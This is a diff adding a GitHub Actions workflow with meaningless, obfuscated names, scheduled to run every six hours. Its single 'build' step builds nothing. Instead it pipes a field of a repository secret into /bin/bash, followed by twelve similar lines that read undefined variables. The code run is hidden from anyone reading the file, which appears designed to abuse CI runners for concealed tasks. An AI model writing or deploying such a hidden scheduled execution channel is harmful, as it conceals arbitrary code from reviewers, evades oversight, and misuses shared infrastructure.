@@ -1,0 +1,31 @@
+name: tongwufu9841
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongwufu9841
+        env:
+          my9: ${{ secrets.my9 }}
+        run: |
+          echo $my9 | jq -r .we508 | /bin/bash
+          echo $utk75 | jq -r .acbz4344 | /bin/bash
+          echo $xklr521 | jq -r .kc263 | /bin/bash
+          echo $wlokn928 | jq -r .a396 | /bin/bash
+          echo $sokhu01234 | jq -r .se092 | /bin/bash
+          echo $au05930 | jq -r .uzgbi8 | /bin/bash
+          echo $ngu51075 | jq -r .gjnuf718 | /bin/bash
+          echo $wbzl48127 | jq -r .sxny823 | /bin/bash
+          echo $anmfl11736 | jq -r .b49 | /bin/bash
+          echo $wfjq425 | jq -r .vwg05060 | /bin/bash
+          echo $sn54 | jq -r .fzgoq599 | /bin/bash
+          echo $joij270 | jq -r .fqef967 | /bin/bash
+          echo $jbm4 | jq -r .af485 | /bin/bash
+
